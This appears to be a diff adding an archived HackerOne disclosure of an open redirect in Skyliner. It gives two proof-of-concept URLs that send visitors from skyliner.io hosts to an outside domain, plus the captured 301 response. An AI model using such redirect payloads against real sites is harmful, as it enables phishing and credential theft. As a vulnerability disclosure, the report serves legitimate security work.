@@ -1,0 +1,27 @@
+ReportLink:https://hackerone.com/reports/163124
+WeaknessName:Open Redirect
+Reporter:https://hackerone.com/bobrov
+ReportedTo:Skyliner(skyliner)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:29.09.2016 17:24:12
+
+Summary:
+
+**PoC**
+```
+https://skyliner.io//blackfan.ru/
+https://qa.skyliner.io//blackfan.ru/
+```
+
+**HTTP Response**
+```
+HTTP/1.1 301 Moved Permanently
+Content-Length: 0
+Connection: close
+Date: Wed, 24 Aug 2016 17:30:39 GMT
+Location: //blackfan.ru
+```
+
+https://cwe.mitre.org/data/definitions/601.html
